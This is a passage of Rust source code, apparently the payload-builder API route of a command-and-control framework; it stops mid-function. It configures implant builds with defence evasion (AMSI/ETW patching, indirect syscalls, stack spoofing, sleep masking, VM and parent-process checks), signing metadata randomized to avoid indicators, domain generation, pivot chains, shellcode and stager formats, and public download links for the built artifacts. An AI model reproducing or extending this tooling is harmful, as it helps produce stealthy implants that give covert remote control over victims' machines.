// src/api/routes/builder.rs

use axum::{
    extract::{Path, State},
    http::{StatusCode, header},
    response::{IntoResponse, Response},
    Json, Extension,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::path::PathBuf;
use std::process::Stdio;
use tokio::io::AsyncBufReadExt;
use uuid::Uuid;
use chrono::Utc;

use crate::api::state::{ApiContext, BuildJob, BuildStatus};
use crate::api::middleware::OperatorInfo;

// ── Request / Response types ───────────────────────────────────────────

#[derive(Deserialize)]
pub struct BuildRequest {
    pub host: String,
    pub port: String,
    #[serde(default = "default_platform")]  pub platform:   String,
    #[serde(default = "default_transport")] pub transport:  String,
    #[serde(default = "default_profile")]   pub profile:    String,
    #[serde(default = "default_format")]    pub format:     String,
    /// Authenticode-sign the PE. Tri-state: true = force on (CLI --sign),
    /// false = force off (CLI --no-sign), absent = auto: the builder signs
    /// when a cert is available (sign_cert set or certs/rcm_sign.p12 on the
    /// server) and skips signing when no cert exists.
    #[serde(default)]                     pub sign:       Option<bool>,
    #[serde(default)]                     pub sign_cert:  Option<String>,
    #[serde(default)]                     pub sign_pass:  Option<String>,
    #[serde(default)]                     pub sign_ts:    Option<String>,
    /// Authenticode metadata overrides (osslsigncode -n / -i and the CN of
    /// the throwaway self-signed cert). Unset fields are randomized per
    /// build so signatures are not a static IOC.
    #[serde(default)]                     pub sign_name:  Option<String>,
    #[serde(default)]                     pub sign_url:   Option<String>,
    #[serde(default)]                     pub sign_cn:    Option<String>,
    /// Bake in the VM-check opt-out (--allow-vm): the built agent skips the
    /// hypervisor artifact check. For known KVM/qemu cloud VPS targets.
    #[serde(default)]                     pub allow_vm:   bool,
    /// Comma-separated exe names the agent's PARENT process must match
    /// (bare basenames, e.g. "explorer.exe,svchost.exe"; the agent compares
    /// against the parent's basename). Empty = disabled. CLI --valid-parents.
    #[serde(default)]                     pub valid_parents: String,
    /// Explicit egress proxy URL for the agent, e.g.
    /// "http://proxy.corp.com:8080" (CLI --proxy-url). When set, the agent
    /// uses this proxy instead of the host's system proxy settings.
    #[serde(default)]                     pub proxy_url:  Option<String>,
    /// Proxy credentials (only meaningful with proxy_url).
    #[serde(default)]                     pub proxy_user: Option<String>,
    #[serde(default)]                     pub proxy_pass: Option<String>,
    #[serde(default = "default_sleep")]     pub sleep:      u64,
    #[serde(default = "default_jmin")]      pub jitter_min: u32,
    #[serde(default = "default_jmax")]      pub jitter_max: u32,
    #[serde(default)]                       pub bloat:      u64,
    #[serde(default)]                       pub debug:           bool,
    #[serde(default)]                       pub days:            i64,
    // ── Feature 1: SNI / ALPN overrides ───────────────────────────────
    #[serde(default)]                       pub sni_override:    Option<String>,
    #[serde(default)]                       pub alpn_protocols:  Vec<String>,
    // ── Feature 3: Hibernation / dweller mode ─────────────────────────
    #[serde(default)]                            pub hibernation_mode: bool,
    #[serde(default)]                            pub batch_size:       Option<u32>,
    // ── Evasion ───────────────────────────────────────────────────────
    #[serde(default = "default_sleep_mask")]     pub sleep_mask:        String,
    #[serde(default = "default_true")]           pub indirect_syscalls: bool,
    #[serde(default = "default_true")]           pub stack_spoof:       bool,
    #[serde(default = "default_true")]           pub patch_amsi_etw:    bool,
    #[serde(default = "default_true")]           pub heap_encrypt:      bool,
    // ── Execution guardrails ──────────────────────────────────────────
    #[serde(default)]                            pub guard_domain:      String,
    #[serde(default)]                            pub guard_hostname:    String,
    #[serde(default)]                            pub guard_hour_start:  u8,
    #[serde(default)]                            pub guard_hour_end:    u8,
    #[serde(default)]                            pub guard_no_system:   bool,
    // ── Pivot auto-cascade ────────────────────────────────────────────
    /// When set, the built agent will automatically start a TCP pivot
    /// listener on this port immediately after its session handshake
    /// completes. Use this to pre-wire multi-hop pivot chains at build
    /// time. Omit (or set null) for direct-connect agents and leaf nodes.
    #[serde(default)]                            pub auto_pivot_port:   Option<u16>,
    // ── Shellcode (format = "shellcode") ──────────────────────────────
    /// ROR13 export hash for the reflective loader ("0x10" = none).
    #[serde(default = "default_sc_hash")]        pub sc_hash:           String,
    /// User-data blob appended to the shellcode.
    #[serde(default = "default_sc_userdata")]    pub sc_userdata:       String,
    /// Loader flags (bit0: erase headers, bit1: obfuscate imports).
    #[serde(default)]                            pub sc_flags:          u32,
    /// On-disk encoding: bin | b64 | c | hex.
    #[serde(default = "default_sc_output")]      pub sc_output:         String,
    // ── New generation formats (donut / pe_to_shellcode / pic_c / bin) ──
    /// Inline C source text for format=pic_c. The route materializes it to
    /// a per-job temp file and forwards it to the builder as --pic-src.
    /// Required iff format == "pic_c".
    #[serde(default)]                            pub pic_src:           Option<String>,
    /// Pipeline spec for format=bin (e.g. "pe,donut", "dll,srdi,b64").
    /// Stages: pe|exe|dll|pic (source, first) then donut|srdi|
    /// pe_to_shellcode|sign|b64. Default: pe,donut.
    #[serde(default)]                            pub pipeline:          Option<String>,
    // ── Artifact customization (Feature: custom certs / icon / name) ──
    /// Artifact filename base override (sanitized to [A-Za-z0-9._-]).
    #[serde(default)]                            pub name:              Option<String>,
    /// Icon: a preset name (resolved to assets/icons/<name>.ico) or an
    /// absolute server path to a .ico file.
    #[serde(default)]                            pub icon:              Option<String>,
    /// Explicit icon preset name (forwarded as --icon-preset).
    #[serde(default)]                            pub icon_preset:       Option<String>,
    /// Server-side directory with ca.crt / client.crt / client.key.der to
    /// embed instead of the stock certs (restored after the build).
    #[serde(default)]                            pub certs_dir:         Option<String>,
    // ── Upload plumbing (base64; materialized to a per-job temp dir) ──
    /// Custom .ico file content, base64-encoded (overrides icon/icon_preset).
    #[serde(default)]                            pub icon_b64:          Option<String>,
    #[serde(default)]                            pub certs_ca_b64:        Option<String>,
    #[serde(default)]                            pub certs_client_crt_b64: Option<String>,
    #[serde(default)]                            pub certs_client_key_b64: Option<String>,
    // ── PE VERSIONINFO customization (Windows exe/service) ─────────────
    /// CompanyName string for the VERSIONINFO resource.
    #[serde(default)]                            pub pe_company:         Option<String>,
    /// ProductName string for the VERSIONINFO resource.
    #[serde(default)]                            pub pe_product:         Option<String>,
    /// FileDescription string for the VERSIONINFO resource.
    #[serde(default)]                            pub pe_description:     Option<String>,
    /// FileVersion (a.b.c.d) for the VERSIONINFO resource.
    #[serde(default)]                            pub pe_file_version:    Option<String>,
    /// ProductVersion (a.b.c.d) for the VERSIONINFO resource.
    #[serde(default)]                            pub pe_product_version: Option<String>,
    // ── ELF customization (Linux targets) ──────────────────────────────
    /// String embedded into a `.comment` ELF section (Linux targets).
    #[serde(default)]                            pub elf_comment:        Option<String>,
    // ── Custom malleable profile / fallback chain (inline content) ─────
    /// Inline malleable-profile JSON, same positional schema the CLI's
    /// --profile-file expects (see traffic_profiles/*.json). Overrides
    /// `profile` when set. Materialized to the per-job temp dir.
    #[serde(default)]                            pub profile_json:       Option<String>,
    /// Inline fallback-chain JSON, same positional FallbackConfig schema
    /// the CLI's --fallback-file expects (see fallback_profiles/*.json).
    #[serde(default)]                            pub fallback_json:      Option<String>,
    /// Materialized temp-file paths for profile_json/fallback_json, set
    /// internally by start_build (never accepted from the client).
    #[serde(skip)]                               pub profile_file:       Option<String>,
    #[serde(skip)]                               pub fallback_file:      Option<String>,
    // ── DGA (domain generation algorithm) ──────────────────────────────
    /// DGA seed. When set, the agent generates extra C2 domains each
    /// window (CLI --dga-seed); the other dga_* values are only forwarded
    /// alongside a seed.
    #[serde(default)]                            pub dga_seed:           Option<u64>,
    /// DGA window length in seconds (CLI default 86400 = 1 day).
    #[serde(default = "default_dga_window")]     pub dga_window:         u64,
    /// Number of DGA domains per window (CLI default 16).
    #[serde(default = "default_dga_count")]      pub dga_count:          u32,
    /// Comma-separated TLD list for DGA (CLI default "com,net,org").
    #[serde(default = "default_dga_tlds")]       pub dga_tlds:           String,
}

fn default_platform()   -> String { "linux".into() }
fn default_transport()  -> String { "tls".into() }
fn default_profile()    -> String { "default".into() }
fn default_format()     -> String { "exe".into() }
fn default_sleep()      -> u64   { 40 }
// Jitter is raw MILLISECONDS added to the base sleep agent-side, matching
// the panel defaults (0/100).
fn default_jmin()       -> u32   { 0 }
fn default_jmax()       -> u32   { 100 }
fn default_sleep_mask() -> String { "ekko".into() }
fn default_true()       -> bool  { true }
fn default_sc_hash()    -> String { "0x10".into() }
fn default_sc_userdata()-> String { "None".into() }
fn default_sc_output()  -> String { "bin".into() }
// DGA defaults mirror the CLI flags exactly.
fn default_dga_window() -> u64    { 86400 }
fn default_dga_count()  -> u32    { 16 }
fn default_dga_tlds()   -> String { "com,net,org".into() }

/// Size cap for inline profile/fallback JSON content. The shipped profiles
/// (traffic_profiles/, fallback_profiles/) are a few KB; 256 KiB leaves
/// generous headroom without allowing memory abuse through the API.
const MAX_INLINE_JSON_BYTES: usize = 256 * 1024;

#[derive(Serialize)]
pub struct BuildStarted { pub job_id: String }

#[derive(Serialize)]
pub struct JobStatusResponse {
    pub job_id:        String,
    pub status:        String,
    pub log:           Vec<String>,
    pub artifact_name: Option<String>,
    /// Internal build id the builder embedded into the agent (the <build_id>
    /// in dist/staged_<build_id>.payload and the /stage/<build_id> path),
    /// harvested from the builder's "[*] Build ID:" log line. Distinct from
    /// job_id, which is only the API queue id. None until the build task
    /// completes and the harvest runs.
    pub build_id:      Option<String>,
    /// Public unauthenticated download link ("/dl/<token>/<name>"), set
    /// once the build succeeds and the artifact is registered for hosting.
    pub download_url:  Option<String>,
    pub started_at:    String,
    pub finished_at:   Option<String>,
}

// ── Helpers ────────────────────────────────────────────────────────────

fn find_builder_binary() -> Option<PathBuf> {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            let p = dir.join("builder");
            if p.is_file() { return Some(p); }
        }
    }
    let p = PathBuf::from("./builder");
    if p.is_file() { return Some(p); }
    None
}

// ── Build serialization and job retention ─────────────────────────────

/// Process-wide build gate. The builder's CertsGuard swaps files in the
/// shared (host-mounted) certs/ tree for the duration of a build, so two
/// overlapping builds would interleave swaps/restores: build A could embed
/// build B's certs, and a restore could capture already-swapped files and
/// permanently lose the stock certs. Builds are serialized here, in the
/// server process that spawns every builder.
static BUILD_GATE: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());

/// Max finished jobs kept in the registry; oldest finished jobs are
/// evicted first. Running jobs are never evicted.
const MAX_FINISHED_JOBS: usize = 64;
/// Finished jobs older than this many seconds are dropped on the next
/// prune pass.
const JOB_TTL_SECS: i64 = 3600;
/// Per-job log line cap; the oldest lines are dropped first so a chatty
/// cargo build cannot grow the registry without bound.
const MAX_JOB_LOG_LINES: usize = 2000;
/// Hard cap on a single build. cargo release builds of this workspace take
/// a few minutes; 30 minutes catches a wedged builder while leaving ample
/// headroom for cold-cache first builds.
const BUILD_HARD_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30 * 60);
/// Grace period for reaping a builder after SIGKILL before giving up.
const BUILD_KILL_GRACE: std::time::Duration = std::time::Duration::from_secs(30);
/// After the builder exits, only buffered log lines remain; the drains get
/// this long to finish before their output is abandoned.
const BUILD_DRAIN_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);

/// Verdict for the bounded child-wait: Exited carries the child's success
/// flag; TimedOut means the watchdog fired and the caller must kill/reap.
#[derive(Debug, PartialEq, Eq)]
enum WaitVerdict {
    Exited(bool),
    TimedOut,
}

/// Map the timeout-wrapped child wait onto a verdict. Extracted for
/// testability; the kill/reap/drain-abort policy stays at the call site.
fn wait_verdict(
    res: Result<std::io::Result<std::process::ExitStatus>, tokio::time::error::Elapsed>,
) -> WaitVerdict {
    match res {
        Ok(status) => WaitVerdict::Exited(status.map(|s| s.success()).unwrap_or(false)),
        Err(_)     => WaitVerdict::TimedOut,
    }
}

/// Prune the build-job registry: TTL-evict old finished jobs, then enforce
/// the finished-job count cap. Called while the jobs lock is held.
/// First log line matching `prefix`, with the value trimmed. Used to
/// harvest the builder's "[+] Binary: " (artifact path) and "[*] Build ID:"
/// (internal build id) markers from a job's captured log.
fn harvest_log_value(log: &[String], prefix: &str) -> Option<String> {
    log.iter().find_map(|line| line.strip_prefix(prefix).map(|v| v.trim().to_string()))
}

fn prune_jobs(jobs: &mut std::collections::HashMap<String, BuildJob>) {
    let now = Utc::now();
    let expired: Vec<String> = jobs.values()
        .filter(|j| !matches!(j.status, BuildStatus::Running))
        .filter(|j| j.finished_at.as_deref()
            .and_then(|ts| chrono::DateTime::parse_from_rfc3339(ts).ok())
            .map(|t| now.signed_duration_since(t.with_timezone(&Utc)).num_seconds() > JOB_TTL_SECS)
            .unwrap_or(false))
        .map(|j| j.id.clone())
        .collect();
    for id in &expired {
        jobs.remove(id);
    }

    let mut finished: Vec<(String, String)> = jobs.values()
        .filter(|j| !matches!(j.status, BuildStatus::Running))
        .map(|j| (j.id.clone(), j.finished_at.clone().unwrap_or_default()))
        .collect();
    if finished.len() > MAX_FINISHED_JOBS {
        // RFC3339 timestamps from Utc::now() sort lexically = chronologically.
        finished.sort_by(|a, b| a.1.cmp(&b.1));
        let excess = finished.len() - MAX_FINISHED_JOBS;
        for (id, _) in finished.into_iter().take(excess) {
            jobs.remove(&id);
        }
    }
}

fn validate_request(req: &BuildRequest) -> Result<(), String> {
    if req.host.is_empty() { return Err("host is required".into()); }
    if req.port.is_empty() { return Err("port is required".into()); }
    match req.platform.as_str() {
        "linux" | "linux-musl" | "windows" | "macos" => {}
        o => return Err(format!("invalid platform: {}", o)),
    }
    match req.transport.as_str() {
        "tls" | "tcp_plain" | "named_pipe" | "http" | "https" => {}
        o => return Err(format!("invalid transport: {}", o)),
    }
    // Hibernation drives ClientTransport::connect() per cycle, which the
    // polling HTTP(S) transport does not support - the agent would never
    // check in. Shared with the CLI builder.
    crate::build_validate::check_hibernation_transport(req.hibernation_mode, &req.transport)?;
    match req.profile.as_str() {
        "default" | "http_post" | "http_image" => {}
        o => return Err(format!("invalid profile: {}", o)),
    }
    match req.format.as_str() {
        "exe" | "dll" | "service" | "stager" | "shellcode"
        | "donut" | "pe_to_shellcode" | "pic_c" | "bin" => {}
        o => return Err(format!("invalid format: {}", o)),
    }
    // Format x platform gate (shared with the CLI builder): dll/service have
    // no ELF/Mach-O equivalent; shellcode/donut/pe_to_shellcode/bin wrap
    // Windows x64 artifacts only.
    crate::build_validate::check_format_platform(&req.format, &req.platform)?;
    // The stager downloads its payload over HTTPS (raw-TCP HTTP fallback)
    // from the same listener port; it cannot speak raw-TLS or named-pipe.
    if req.format == "stager" && !matches!(req.transport.as_str(), "http" | "https") {
        return Err(format!(
            "format=stager requires transport http or https (the stager speaks \
             HTTPS to /stage/<build_id>), not transport={}",
            req.transport
        ));
    }
    // pic_c compiles operator-supplied C. When pic_src is omitted (or blank)
    // the builder falls back to the bundled templates/pic_template.c - same
    // as the CLI.
    if req.format != "pic_c" && req.pic_src.is_some() {
        return Err("pic_src only applies to format=pic_c".into());
    }
    // Pipeline spec: only meaningful for format=bin; validated against the
    // known stage names and ordering rules.
    if let Some(p) = &req.pipeline {
        if req.format != "bin" {
            return Err("pipeline only applies to format=bin".into());
        }
        let stages = crate::pipeline::parse_pipeline(p)?;
        crate::pipeline::validate_pipeline_order(&stages)?;
    }
    if req.format == "shellcode" {
        // platform=windows is enforced by the shared format gate above.
        // Must parse as decimal or 0x-hex u32
        let h = req.sc_hash.trim();
        let parsed = h.strip_prefix("0x").or_else(|| h.strip_prefix("0X"))
            .map(|x| u32::from_str_radix(x, 16))
            .unwrap_or_else(|| h.parse::<u32>());
        if parsed.is_err() {
            return Err(format!("invalid sc_hash: {}", req.sc_hash));
        }
    }
    // sc_output applies to every shellcode-emitting format.
    if matches!(req.format.as_str(), "shellcode" | "donut" | "pe_to_shellcode" | "pic_c") {
        match req.sc_output.as_str() {
            "bin" | "b64" | "c" | "hex" => {}
            o => return Err(format!("invalid sc_output: {}", o)),
        }
    }
    match req.sleep_mask.as_str() {
        // Values the agent implements (agent/mod.rs classify_sleep_mask);
        // "none" is a first-class plain-sleep path (SleepMaskKind::Plain).
        "none" | "ekko" | "spoofed-stack" => {}
        o => return Err(format!("invalid sleep_mask: {}", o)),
    }
    if req.jitter_min > 60000 { return Err("jitter_min cannot exceed 60000 ms".into()); }
    if req.days < 0          { return Err("days must be 0 or positive".into()); }
    if req.guard_hour_start > 23 { return Err("guard_hour_start must be 0–23".into()); }
    if req.guard_hour_end   > 23 { return Err("guard_hour_end must be 0–23".into()); }
    // Artifact customization
    if let Some(n) = &req.name {
        if n.is_empty() || n.len() > 64
            || !n.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')
        {
            return Err("name must be 1-64 chars of [A-Za-z0-9._-]".into());
        }
    }
    // Server-side path confinement: icon paths must resolve under
    // assets/icons/ (or the per-job upload temp dir, which start_build
    // materializes icon_b64 into); certs_dir under certs/ (or the temp dir
    // for certs_*_b64 uploads). Absolute paths anywhere else (e.g.
    // /etc/passwd) would let an operator token read arbitrary server files
    // into build artifacts or substitute CA material from any server path.
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let temp = std::env::temp_dir();
    for preset in [&req.icon_preset, &req.icon].into_iter().flatten() {
        let is_path = preset.contains('/') || preset.contains('\\');
        if is_path {
            let roots = [cwd.join("assets").join("icons"), temp.clone()];
            crate::build_validate::confine_server_path(preset, &cwd, &roots)?;
        } else if !preset.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-') {
            // Bare preset names must be plain identifiers.
            return Err(format!("invalid icon reference: {}", preset));
        }
    }
    if let Some(d) = &req.certs_dir {
        let roots = [cwd.join("certs"), temp.clone()];
        crate::build_validate::confine_server_path(d, &cwd, &roots)?;
    }
    // Certs bundle upload is all-or-nothing.
    let certs_parts = [&req.certs_ca_b64, &req.certs_client_crt_b64, &req.certs_client_key_b64];
    if certs_parts.iter().any(|p| p.is_some()) && certs_parts.iter().any(|p| p.is_none()) {
        return Err("certs bundle upload requires ca, client cert and client key (all three)".into());
    }
    // PE VERSIONINFO strings: bounded length, no control characters.
    for s in [&req.pe_company, &req.pe_product, &req.pe_description].into_iter().flatten() {
        if s.len() > 256 || s.chars().any(|c| c.is_control()) {
            return Err("pe_company/pe_product/pe_description must be <=256 chars with no control characters".into());
        }
    }
    for v in [&req.pe_file_version, &req.pe_product_version].into_iter().flatten() {
        let parts: Vec<&str> = v.split('.').collect();
        if parts.len() != 4 || parts.iter().any(|p| p.parse::<u16>().is_err()) {
            return Err(format!("invalid PE version '{}': expected a.b.c.d (0-65535)", v));
        }
    }
    if let Some(cm) = &req.elf_comment {
        if cm.len() > 512 || cm.chars().any(|c| c.is_control()) {
            return Err("elf_comment must be <=512 chars with no control characters".into());
        }
    }
    // Inline profile/fallback JSON: size-capped and parse-checked against
    // the same types the CLI feeds from --profile-file/--fallback-file, so
    // a broken document fails fast here instead of mid-build.
    if let Some(p) = &req.profile_json {
        if p.len() > MAX_INLINE_JSON_BYTES {
            return Err(format!("profile_json exceeds {} bytes", MAX_INLINE_JSON_BYTES));
        }
        serde_json::from_str::<crate::common::MalleableProfile>(p)
            .map_err(|e| format!("invalid profile_json (expected the positional --profile-file format): {}", e))?;
    }
    if let Some(f) = &req.fallback_json {
        if f.len() > MAX_INLINE_JSON_BYTES {
            return Err(format!("fallback_json exceeds {} bytes", MAX_INLINE_JSON_BYTES));
        }
        serde_json::from_str::<crate::common::FallbackConfig>(f)
            .map_err(|e| format!("invalid fallback_json (expected the positional --fallback-file format): {}", e))?;
    }
    // DGA bounds. The values only take effect alongside dga_seed, but they
    // are validated unconditionally so enabling DGA later cannot surface
    // junk that slipped in earlier.
    if !(60..=2_592_000).contains(&req.dga_window) {
        return Err("dga_window must be 60..=2592000 seconds (1 minute to 30 days)".into());
    }
    if !(1..=256).contains(&req.dga_count) {
        return Err("dga_count must be 1..=256".into());
    }
    {
        let tlds: Vec<&str> = req.dga_tlds.split(',').collect();
        if tlds.len() > 16
            || tlds.iter().any(|t| t.is_empty() || t.len() > 24
                || !t.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'))
        {
            return Err("dga_tlds must be 1..=16 comma-separated DNS labels ([a-z0-9-], <=24 chars each)".into());
        }
    }
    check_valid_parents(&req.valid_parents)?;
    // Egress proxy: credentials require a URL, and the URL needs an
    // explicit scheme (the ProxyConfig.url form the agent expects).
    match &req.proxy_url {
        Some(u) => {
            let u = u.trim();
            if u.is_empty() {
                return Err("proxy_url must not be empty".into());
            }
            if u.len() > 512 || u.chars().any(|c| c.is_control()) || !u.contains("://") {
                return Err(format!(
                    "proxy_url '{}' is not a valid proxy URL (expect e.g. http://proxy.corp.com:8080)",
                    u
                ));
            }
        }
        None => {
            if req.proxy_user.is_some() || req.proxy_pass.is_some() {
                return Err("proxy_user/proxy_pass require proxy_url".into());
            }
        }
    }
    Ok(())
}

/// Mirror of the CLI's --valid-parents parse rules: bare exe names only
/// (the agent's is_bad_parent compares against the parent's executable
/// basename), no empty entries, at most 32.
fn check_valid_parents(raw: &str) -> Result<(), String> {
    if raw.trim().is_empty() {
        return Ok(());
    }
    let parts: Vec<&str> = raw.split(',').collect();
    if parts.len() > 32 {
        return Err("valid_parents: at most 32 entries".into());
    }
    for p in parts {
        let p = p.trim();
        if p.is_empty() {
            return Err("valid_parents: empty entry (remove stray commas)".into());
        }
        if p.len() > 260 || p.chars().any(|c| c.is_control()) {
            return Err(format!("valid_parents: invalid entry '{}'", p));
        }
        if p.contains('/') || p.contains('\\') {
            return Err(format!(
                "valid_parents: '{}' looks like a path - pass exe basenames only",
                p
            ));
        }
    }
    Ok(())
}

// ── CLI arg construction (extracted for testability) ───────────────────

pub fn build_args(req: &BuildRequest) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "--host".into(),       req.host.clone(),
        "--port".into(),       req.port.clone(),
        "--platform".into(),   req.platform.clone(),
        "--transport".into(),  req.transport.replace('_', "-"),
        "--profile".into(),    req.profile.replace('_', "-"),
        "--format".into(),     req.format.clone(),
        "--sleep".into(),      req.sleep.to_string(),
        "--jitter-min".into(), req.jitter_min.to_string(),
        "--jitter-max".into(), req.jitter_max.to_string(),
        "--bloat".into(),      req.bloat.to_string(),
        "--days".into(),       req.days.to_string(),
    ];
    // Signing tri-state: explicit true -> --sign, explicit false ->
    // --no-sign, absent -> builder auto-decides from cert availability.
    // The sign extras are forwarded whenever present (sign_cert alone is
    // enough for the auto default to sign).
    match req.sign {
        Some(true) => args.push("--sign".into()),
        Some(false) => args.push("--no-sign".into()),
        None => {}
    }
    if let Some(c) = &req.sign_cert { args.extend(["--sign-cert".into(), c.clone()]); }
    if let Some(p) = &req.sign_pass { args.extend(["--sign-pass".into(), p.clone()]); }
    if let Some(t) = &req.sign_ts   { args.extend(["--sign-ts".into(),   t.clone()]); }
    if let Some(n) = &req.sign_name { args.extend(["--sign-name".into(), n.clone()]); }
    if let Some(u) = &req.sign_url  { args.extend(["--sign-url".into(),  u.clone()]); }
    if let Some(n) = &req.sign_cn   { args.extend(["--sign-cn".into(),   n.clone()]); }
    if req.allow_vm { args.push("--allow-vm".into()); }
    if !req.valid_parents.trim().is_empty() {
        args.extend(["--valid-parents".into(), req.valid_parents.clone()]);
    }
    if let Some(u) = &req.proxy_url {
        args.extend(["--proxy-url".into(), u.clone()]);
        if let Some(v) = &req.proxy_user { args.extend(["--proxy-user".into(), v.clone()]); }
        if let Some(v) = &req.proxy_pass { args.extend(["--proxy-pass".into(), v.clone()]); }
    }
    // Custom profile/fallback: the CLI takes file paths; start_build
    // materializes profile_json/fallback_json into the per-job temp dir and
    // fills these internal fields with the paths.
    if let Some(p) = &req.profile_file  { args.extend(["--profile-file".into(),  p.clone()]); }
    if let Some(p) = &req.fallback_file { args.extend(["--fallback-file".into(), p.clone()]); }
    // DGA: the CLI embeds DGA config only when --dga-seed is set, so the
    // window/count/tlds values are forwarded only alongside a seed (they
    // carry CLI-identical defaults anyway).
    if let Some(seed) = req.dga_seed {
        args.extend(["--dga-seed".into(),   seed.to_string()]);
        args.extend(["--dga-window".into(), req.dga_window.to_string()]);
        args.extend(["--dga-count".into(),  req.dga_count.to_string()]);
        args.extend(["--dga-tlds".into(),   req.dga_tlds.clone()]);
    }
    if req.debug { args.push("--debug".into()); }
    if let Some(sni) = &req.sni_override {
        args.push("--sni".into());
        args.push(sni.clone());
    }
    if !req.alpn_protocols.is_empty() {
        args.push("--alpn".into());
        args.push(req.alpn_protocols.join(","));
    }
    if req.hibernation_mode { args.push("--hibernation".into()); }
    if let Some(bs) = req.batch_size {
        args.push("--batch-size".into());
        args.push(bs.to_string());
    }
    // Evasion
    args.push("--sleep-mask".into());
    args.push(req.sleep_mask.clone());
    args.extend(["--indirect-syscalls".into(), req.indirect_syscalls.to_string()]);
    args.extend(["--stack-spoof".into(),       req.stack_spoof.to_string()]);
    args.extend(["--patch-amsi-etw".into(),    req.patch_amsi_etw.to_string()]);
    args.extend(["--heap-encrypt".into(),      req.heap_encrypt.to_string()]);
    // Guardrails
    if !req.guard_domain.is_empty() {
        args.push("--guard-domain".into());
        args.push(req.guard_domain.clone());
    }
    if !req.guard_hostname.is_empty() {
        args.push("--guard-hostname".into());
        args.push(req.guard_hostname.clone());
    }
    if req.guard_hour_start > 0 || req.guard_hour_end > 0 {
        args.push("--guard-hours".into());
        args.push(format!("{}-{}", req.guard_hour_start, req.guard_hour_end));
    }
    if req.guard_no_system { args.push("--guard-no-system".into()); }
    // Pivot auto-cascade
    if let Some(port) = req.auto_pivot_port {
        args.push("--auto-pivot-port".into());
        args.push(port.to_string());
    }
    // Shellcode options - meaningful for the shellcode-emitting formats.
    // (sc_hash/sc_userdata/sc_flags are consumed by shellcode and
    // pe_to_shellcode; sc_output also applies to donut and pic_c.)
    if matches!(req.format.as_str(), "shellcode" | "donut" | "pe_to_shellcode" | "pic_c") {
        args.extend(["--sc-output".into(),   req.sc_output.clone()]);
    }
    if matches!(req.format.as_str(), "shellcode" | "pe_to_shellcode") {
        args.extend(["--sc-hash".into(),     req.sc_hash.clone()]);
        args.extend(["--sc-userdata".into(), req.sc_userdata.clone()]);
        args.extend(["--sc-flags".into(),    req.sc_flags.to_string()]);
    }
    // New generation formats
    if req.format == "pic_c" {
        // At this point pic_src has been materialized to a temp file path
        // by start_build (inline C text never reaches the builder CLI).
        if let Some(p) = &req.pic_src {
            args.extend(["--pic-src".into(), p.clone()]);
        }
    }
    if req.format == "bin" {
        if let Some(p) = &req.pipeline {
            args.extend(["--pipeline".into(), p.clone()]);
        }
    }
    // Artifact customization
    if let Some(n) = &req.name {
        args.extend(["--name".into(), n.clone()]);
    }
    if let Some(ic) = &req.icon {
        // Accept either a preset name or a server-side path to a .ico file.
        if ic.contains('/') || ic.contains('\\') || ic.to_lowercase().ends_with(".ico") {
            args.extend(["--icon".into(), ic.clone()]);
        } else {
            args.extend(["--icon-preset".into(), ic.clone()]);
        }
    }
    if let Some(p) = &req.icon_preset {
        args.extend(["--icon-preset".into(), p.clone()]);
    }
    if let Some(d) = &req.certs_dir {
        args.extend(["--certs-dir".into(), d.clone()]);
    }
    // PE VERSIONINFO customization
    if let Some(v) = &req.pe_company         { args.extend(["--pe-company".into(),         v.clone()]); }
    if let Some(v) = &req.pe_product         { args.extend(["--pe-product".into(),         v.clone()]); }
    if let Some(v) = &req.pe_description     { args.extend(["--pe-description".into(),     v.clone()]); }
    if let Some(v) = &req.pe_file_version    { args.extend(["--pe-file-version".into(),    v.clone()]); }
    if let Some(v) = &req.pe_product_version { args.extend(["--pe-product-version".into(), v.clone()]); }
    // ELF customization
    if let Some(v) = &req.elf_comment        { args.extend(["--elf-comment".into(),        v.clone()]); }
    args
}

// ── Route handlers ─────────────────────────────────────────────────────

/// POST /api/builder/build
pub async fn start_build(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Json(req): Json<BuildRequest>,
) -> Response {
    if operator.is_viewer() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error":"Viewers cannot trigger builds"}))).into_response();
    }
    if let Err(e) = validate_request(&req) {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": e}))).into_response();
    }

    let builder_path = match find_builder_binary() {
        Some(p) => p,
        None => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({
            "error": "builder binary not found alongside server binary or in CWD"
        }))).into_response(),
    };

    let job_id = Uuid::new_v4().to_string();
    {
        let mut jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        jobs.insert(job_id.clone(), BuildJob {
            id:            job_id.clone(),
            status:        BuildStatus::Running,
            log:           Vec::new(),
            artifact_path: None,
            build_id:      None,
            started_at:    Utc::now().to_rfc3339(),
            finished_at:   None,
            operator:      operator.username.clone(),
        });
        // The registry is insert-only otherwise and retains every job's full
        // cargo log forever - prune finished jobs on each new build.
        prune_jobs(&mut jobs);
    }

    if let Ok(conn) = state.db.get() {
        crate::database::audit_log(
            &conn, operator.id, &operator.username, "builder_start", None,
            Some(&format!("platform={} transport={} format={} host={}:{}",
                req.platform, req.transport, req.format, req.host, req.port)),
        );
    }

    let jobs_arc = state.build_jobs.clone();
    let payload_links = state.payload_links.clone();
    let jid      = job_id.clone();

    tokio::spawn(async move {
        // ── Materialize base64 uploads into a per-job temp dir ─────────
        // icon_b64 -> <dir>/icon.ico (passed as --icon, overrides preset);
        // certs triple -> <dir>/{ca.crt,client.crt,client.key.der} (--certs-dir).
        // The dir is removed in the watcher teardown below.
        let mut req = req;
        // Blank pic_src means "use the bundled template" (CLI parity): drop
        // it so no empty temp .c file is materialized and no --pic-src arg
        // is forwarded.
        if req.pic_src.as_deref().map_or(false, |s| s.trim().is_empty()) {
            req.pic_src = None;
        }
        let upload_dir: Option<PathBuf> = if req.icon_b64.is_some()
            || req.certs_ca_b64.is_some()
            || (req.format == "pic_c" && req.pic_src.is_some())
